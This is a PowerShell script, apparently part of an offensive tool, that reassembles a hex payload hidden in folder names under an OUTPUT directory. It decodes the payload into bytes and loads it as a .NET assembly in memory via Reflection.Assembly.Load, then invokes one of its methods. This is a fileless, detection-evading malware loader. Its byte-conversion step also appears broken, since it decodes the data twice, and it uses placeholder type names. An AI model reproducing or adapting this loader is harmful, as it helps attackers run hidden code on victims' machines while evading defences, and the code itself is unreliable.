 



#### DECODER ######

function decoderRing {

    $currentDirectory = Get-Location

    # Set the root directory
    $rootDirectory = $currentDirectory
    #echo "Root directory: $rootDirectory"

    # clear this value
    $decoder_hex_string = ""

    $topLevelFolders = Get-ChildItem -Path "$rootDirectory\OUTPUT" -Directory
    # Iterate through each top-level folder
    foreach ($folder in $topLevelFolders) {

        echo "Testing foldr: $($folder.Name)"
        $purehex = ($folder.Name.substring(6))
        $purehex += (Get-ChildItem -Recurse -Directory "OUTPUT\$folder"  | select-object -Property Name).Name

        $purehex = $purehex.replace("-","").replace("\","").replace(" ","")

        #echo $folder
        #echo $purehex
        #echo "=----------------="

        $decoder_hex_string += $purehex


}


echo "Our hex string is this:"
$decoder_hex_string
# realized we won't have hexstring.length on decoding
#$decoder_hex_string = $decoder_hex_string.substring(0,$hexString.Length)

echo "our hex string is $($decoder_hex_string.Length) chars long"
sleep 5


#echo "Decoded it looks like this:"
# Split the hex string into chunks of 2 characters (each representing a byte)
$decoded_bytes = [regex]::Matches($decoder_hex_string, '..') | ForEach-Object { [Convert]::ToByte($_.Value, 16) }

$outputpath = "$currentDirectory\decoded_output.txt"

#echo "Writing our payload to file: $outputpath"
echo "Running..."

# Write the byte stream to the file
#Set-Content -Path $outputpath -Value $decoded_bytes -Encoding Byte
#$dirDevilAssembly = [System.Reflection.Assembly]::Load($decoded_bytes)

$byteArray = [byte[]]($decoded_bytes -split '(..)' | Where-Object { $_ } | ForEach-Object { [Convert]::ToByte($_, 16) })

# Load the assembly from byte array
$assembly = [System.Reflection.Assembly]::Load($byteArray)

# Example of executing a method from the assembly
# Assuming there's a type 'MyType' and a static method 'MyMethod' you want to call
$type = $assembly.GetType("Namespace.MyType")
$method = $type.GetMethod("MyMethod")
$method.Invoke($null, $null)


}

decoderRing
 
